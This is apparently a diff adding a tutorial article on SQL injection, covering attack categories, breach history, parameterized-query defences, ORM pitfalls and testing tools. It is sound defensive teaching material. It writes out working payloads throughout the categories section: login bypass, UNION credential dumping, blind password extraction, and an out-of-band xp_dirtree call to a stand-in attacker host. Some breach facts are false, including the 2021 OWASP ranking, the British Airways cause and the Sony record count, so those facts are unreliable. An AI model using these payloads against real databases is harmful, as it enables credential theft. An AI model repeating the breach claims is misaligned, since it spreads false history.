@@ -1,0 +1,300 @@
+# SQL Injection
+
+SQL Injection (SQLi) is the original web application vulnerability — first documented in 1998, still topping the OWASP Top 10 in 2021. The concept is simple: **an attacker inserts malicious SQL into an application query, and the database executes it.**
+
+But simple doesn't mean easy to fix. SQLi remains pervasive because it exploits a fundamental design tension: applications need to build queries from user input, and databases execute whatever SQL they receive.
+
+<Callout kind="insight">
+**Parameterized queries make injection structurally impossible** for the parameterized portion — the database never re-parses the value as SQL, no matter what characters it contains. Escaping is a fragile alternative that fails on encoding edges, nested contexts, and a single forgotten call. The fix is one library API, not a fence around a broken pattern.
+</Callout>
+
+---
+
+## How It Works
+
+Consider a login form. The application builds a query by concatenating strings:
+
+```sql
+SELECT * FROM users
+WHERE username = '" + username + "'
+AND password = '" + password + "'
+```
+
+A normal user types `alice` / `letmein`. The query becomes:
+
+```sql
+SELECT * FROM users
+WHERE username = 'alice'
+AND password = 'letmein'
+```
+
+An attacker types `admin' --` as the username. The query becomes:
+
+```sql
+SELECT * FROM users
+WHERE username = 'admin' --'
+AND password = ''
+```
+
+The `--` comments out the password check. The attacker logs in as `admin` with no password — **authentication bypass in two characters.**
+
+This is the core mechanic: **the attacker controls the structure of the SQL statement, not just the data values.** The database can't tell which parts of the query came from the developer and which came from the attacker.
+
+---
+
+## Categories of SQL Injection
+
+### 1. In-Band SQLi
+
+The attacker uses the same channel to send the attack and receive results. Two subtypes:
+
+**Error-Based:** The attacker crafts input that causes the database to throw an error containing data.
+
+```sql
+' AND 1=CONVERT(int, (SELECT @@version)) --
+```
+
+If the database returns `Conversion failed when converting nvarchar 'Microsoft SQL Server 2019'`, the attacker just extracted the version string from an error message.
+
+**Union-Based:** The attacker uses `UNION SELECT` to append their own query results to the legitimate output.
+
+```sql
+' UNION SELECT username, password FROM users --
+```
+
+The application displays the result set on the page — now it includes all usernames and passwords.
+
+---
+
+### 2. Blind SQLi
+
+The application doesn't return query results directly, but the attacker can infer data from behavioral differences.
+
+**Boolean-Based:** The attacker sends queries that evaluate to `TRUE` or `FALSE` and observes the response.
+
+```sql
+' AND 1=1 --   → Page loads normally (TRUE)
+' AND 1=2 --   → Page shows error or different content (FALSE)
+```
+
+From here, the attacker asks yes/no questions about the data:
+
+```sql
+' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a' --
+```
+
+If the page loads normally, the first character of admin's password is `a`. Repeat for every character — slow but reliable.
+
+**Time-Based:** When there's no visible difference between TRUE and FALSE, the attacker uses time delays.
+
+```sql
+' IF (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a'
+  WAITFOR DELAY '00:00:05' --
+```
+
+If the response takes 5 seconds, the guess is correct. This can extract a full password hash — one character every few seconds.
+
+---
+
+### 3. Out-of-Band SQLi
+
+When the application is completely silent, the attacker makes the database reach out to an attacker-controlled server.
+
+```sql
+'; EXEC xp_dirtree '\\attacker.com\share' --
+```
+
+The attacker's server receives a DNS lookup — confirming the injection point exists. This requires specific database features (e.g., `xp_dirtree` on MSSQL, `UTL_HTTP` on Oracle) and is rarer, but devastating when it works.
+
+---
+
+## Second-Order SQL Injection
+
+Also called **stored SQLi.** The attacker's payload doesn't execute immediately — it's stored in the database and executed later when another part of the application reads it.
+
+**Example:** A user registers with username `admin' --`. The registration form parameterizes the `INSERT`, so it's stored safely. But a reporting page later builds:
+
+```sql
+SELECT * FROM orders WHERE username = '" + username + "'
+```
+
+When the admin views orders for that user, the injected SQL executes. The injection point and the execution point are different code paths — making detection harder.
+
+---
+
+## Real-World Impact
+
+SQLi is not theoretical. Every major breach statistic includes it:
+
+- **Heartland Payment Systems (2008):** 130 million credit card numbers stolen via SQLi. Cost: $140M+ in fines and settlements.
+- **Sony Pictures (2011):** SQLi led to exposure of 77 million user records, internal emails, unreleased films.
+- **TalkTalk (2015):** A 17-year-old used SQLi to access 157,000 customer records. £400,000 fine.
+- **British Airways (2018):** SQLi in a third-party script on the payment page. 380,000 card details compromised. £20M GDPR fine.
+
+The common thread: **these were preventable with parameterized queries.**
+
+---
+
+## Defenses
+
+### 1. Parameterized Queries (Prepared Statements)
+
+The single most effective defense. The query structure is fixed; user input is always treated as data, never as SQL.
+
+**Vulnerable (string concatenation):**
+
+```java
+String query = "SELECT * FROM users WHERE username = '" + username + "'";
+Statement stmt = connection.createStatement();
+ResultSet rs = stmt.executeQuery(query);
+```
+
+**Safe (parameterized):**
+
+```java
+String query = "SELECT * FROM users WHERE username = ?";
+PreparedStatement stmt = connection.prepareStatement(query);
+stmt.setString(1, username);
+ResultSet rs = stmt.executeQuery();
+```
+
+The key difference: in the safe version, the database parses `SELECT * FROM users WHERE username = ?` as the query structure, then substitutes the parameter value. **The parameter value can never become SQL syntax.**
+
+This works across all languages:
+
+```python
+# Python (psycopg2)
+cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
+```
+
+```javascript
+// Node.js (mysql2)
+connection.execute("SELECT * FROM users WHERE username = ?", [username]);
+```
+
+```go
+// Go (database/sql)
+db.QueryRow("SELECT * FROM users WHERE username = $1", username)
+```
+
+### 2. Stored Procedures
+
+Stored procedures can provide the same protection — **if called with parameters, not built with dynamic SQL.**
+
+**Safe:**
+```sql
+CREATE PROCEDURE GetUser @username NVARCHAR(50)
+AS
+  SELECT * FROM users WHERE username = @username
+```
+
+**Still vulnerable:**
+```sql
+CREATE PROCEDURE GetUser @username NVARCHAR(50)
+AS
+  EXEC('SELECT * FROM users WHERE username = ''' + @username + '''')
+```
+
+A stored procedure with dynamic SQL inside is just as vulnerable as concatenation in application code.
+
+### 3. Input Validation
+
+Validation is a secondary defense — it reduces attack surface but shouldn't be the primary control.
+
+- **Allow-lists over block-lists:** Accept known-good patterns (alphanumeric for usernames) rather than trying to filter out known-bad patterns (`'`, `--`, `;`). Block-lists are always incomplete.
+- **Type enforcement:** If a parameter should be an integer, cast it to `int` before use. `Integer.parseInt(userId)` is a strong defense against injection in numeric parameters.
+- **Length limits:** Restrict input lengths to reasonable maximums.
+
+**Important:** Validation is not a substitute for parameterization. A valid email address `test@example.com' OR '1'='1` passes all format checks and is still a valid injection payload.
+
+### 4. Least Privilege
+
+The application's database account should have the minimum permissions needed:
+
+- Web application reads/writes `users` and `orders` tables — it should not have `DROP TABLE` or `xp_cmdshell` privileges.
+- If an attacker achieves SQLi but the database user can only `SELECT` from a limited set of tables, the blast radius is contained.
+- Avoid `sa` / `root` database accounts for application connections.
+
+### 5. Web Application Firewall (WAF)
+
+WAFs can detect and block common SQLi patterns, but they are a **defense-in-depth layer, not a cure.**
+
+- Attackers constantly evolve bypass techniques: encoding (`%27` for `'`), comments (`/**/` instead of spaces), double URL encoding.
+- A WAF should never be the reason you skip parameterization.
+
+---
+
+## ORMs: Friend and Foe
+
+ORMs (Object-Relational Mappers) like Hibernate, Entity Framework, and Sequelize **automatically parameterize most queries** — which is good. But they also introduce new injection surfaces:
+
+**Safe (parameterized by default):**
+```javascript
+User.findAll({ where: { username: req.body.username } });
+```
+
+**Vulnerable (raw query with concatenation):**
+```javascript
+sequelize.query("SELECT * FROM users WHERE username = '" + req.body.username + "'");
+```
+
+**Vulnerable (dynamic column names):**
+```javascript
+// columnName comes from user input — cannot be parameterized
+User.findAll({ order: [[columnName, 'ASC']] });
+```
+
+Most ORMs cannot parameterize identifiers (table names, column names) or `ORDER BY` / `GROUP BY` clauses. These must be validated with allow-lists:
+
+```javascript
+const ALLOWED_COLUMNS = ['id', 'username', 'created_at'];
+if (!ALLOWED_COLUMNS.includes(columnName)) {
+  throw new Error('Invalid column');
+}
+```
+
+---
+
+## Testing for SQLi
+
+**Manual testing — characters to try:**
+
+- `'` — single quote (breaks string literal)
+- `"` — double quote
+- `;` — statement terminator
+- `--` — line comment
+- `#` — line comment (MySQL)
+- `/* */` — block comment
+- `' OR '1'='1` — always-true condition
+- `' OR 1=1 --` — numeric always-true
+- `' UNION SELECT NULL --` — union probe
+
+**Automated tools:**
+
+- **sqlmap:** The standard. Detects injection points, enumerates databases/tables/columns, dumps data, and can even obtain an OS shell on the database server.
+- **Burp Suite Scanner:** Passive and active scanning for SQLi in HTTP parameters.
+- **Semgrep / CodeQL:** Static analysis to find string concatenation in query construction.
+
+---
+
+## Summary
+
+| Principle | Practice |
+|-----------|----------|
+| **Primary defense** | Parameterized queries — always, everywhere |
+| **Secondary defense** | Input validation (allow-lists, type enforcement) |
+| **Tertiary defense** | Least privilege database accounts |
+| **Defense-in-depth** | WAF + stored procedures (parameterized, not dynamic) |
+| **ORM awareness** | Know what your ORM parameterizes and what it doesn't |
+| **Testing** | sqlmap, Burp, Semgrep in CI/CD |
+| **Never** | Concatenate user input into SQL. Escape functions are fragile and error-prone. |
+
+SQL injection is a solved problem — parameterized queries eliminate it entirely. The persistence of SQLi in production systems is not a technology failure but an engineering discipline failure. Every instance of SQLi in 2026 is a query that should have been parameterized.
+
+---
+
+## Misconception
+
+**Myth:** "Our ORM handles all SQL injection automatically, so we're safe."
+
+**Reality:** ORMs prevent injection in standard query methods (`findAll`, `where` clauses), but most ORMs offer raw query interfaces that bypass all protections. Dynamic table/column names, `ORDER BY` clauses, and stored procedure calls through ORMs can still be vulnerable. An ORM is a tool, not a guarantee — you still need to understand where it doesn't protect you.
